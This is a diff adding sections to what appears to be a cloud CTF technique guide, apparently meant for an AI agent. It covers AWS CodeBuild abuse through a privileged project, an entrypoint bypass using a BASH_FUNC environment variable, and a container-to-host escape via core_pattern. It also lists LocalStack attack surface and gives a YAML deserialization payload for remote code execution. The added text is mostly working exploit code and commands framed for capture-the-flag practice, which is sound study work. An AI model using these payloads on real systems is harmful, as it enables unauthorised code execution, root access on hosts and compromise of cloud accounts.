@@ -478,10 +478,73 @@ ARN resolution:
 - **Azure SAS token**: parse permissions, resource type, expiry, and signed resource before assuming it grants list or read access.
 - **Azure Key Vault**: check secret versions before treating the latest value as final.
 
+### AWS CodeBuild — privileged container escape
+
+CodeBuild runs build commands inside Docker containers. If you can `codebuild:CreateProject` + `codebuild:StartBuild`:
+
+```python
+cb.create_project(
+    name="pwn",
+    source={"type": "NO_SOURCE", "buildspec": BUILDSPEC},
+    artifacts={"type": "NO_ARTIFACTS"},
+    environment={
+        "type": "LINUX_CONTAINER",
+        "image": "<available-image>",
+        "computeType": "BUILD_GENERAL1_SMALL",
+        "privilegedMode": True,      # ALL capabilities including CAP_SYS_ADMIN
+    },
+    serviceRole="arn:aws:iam::<account>:role/<any-role>",
+)
+cb.start_build(
+    projectName="pwn",
+    environmentVariablesOverride=[...],  # env vars injected into container
+    buildspecOverride=BUILDSPEC,         # override buildspec at build time
+)
+```
+
+**Entrypoint bypass via BASH_FUNC**: If the image entrypoint checks `$(id -u)` with bash as `/bin/sh`, override `id` via env var:
+```python
+environmentVariablesOverride=[
+    {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
+]
+```
+Bash imports `BASH_FUNC_<name>%%` as shell functions. The entrypoint's `if [ "$(id -u)" = '0' ]` calls the fake `id`, skips `gosu`, and the container runs as real root.
+
+**Host escape from privileged container**: Use `core_pattern` to run commands as root on the host:
+```bash
+UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+printf '#!/bin/sh\ncat /root/root.txt>%s/flag.txt\n' $UDIR $UDIR>/e.sh && chmod +x /e.sh
+echo "|$UDIR/e.sh">/proc/sys/kernel/core_pattern
+ulimit -c unlimited && bash -c 'kill -11 $$'
+sleep 4 && cat /flag.txt
+```
+
+### LocalStack / floci — mock AWS with real Docker execution
+
+LocalStack and its fork floci emulate AWS services locally. Key attack surface:
+- **Unauthenticated by default**: `test/test` creds or `--no-sign-request` grants full access
+- **Real Docker execution**: ECS, CodeBuild, Lambda create actual Docker containers on the host
+- **Docker socket mounted**: The floci container has `/var/run/docker.sock` — containers it spawns are siblings on the host
+- **Service enumeration**: `GET /_localstack/health` or `/_floci/health` lists running services
+
+**CTF pattern**: SSRF → IMDS → SQS worker RCE → CodeBuild privileged container → host escape
+
+### SQS worker YAML deserialization
+
+If a worker polls SQS and uses `yaml.load(body, Loader=yaml.Loader)` (unsafe), inject code:
+```yaml
+name: rce
+script: |
+  import subprocess
+  subprocess.run(["cat", "/flag.txt"])
+```
+Alternative: `!!python/object/apply:os.system ["command"]` for direct YAML deserialization RCE.
+
 ## Technique integration
 
 Load for deep methodology:
 - `cloud-security-technique` — full enumeration workflows, IAM paths, detection-aware pivoting.
+- `container-technique` — container escape vectors including core_pattern, cgroups, Docker socket.
 
 ## Tool routing
 
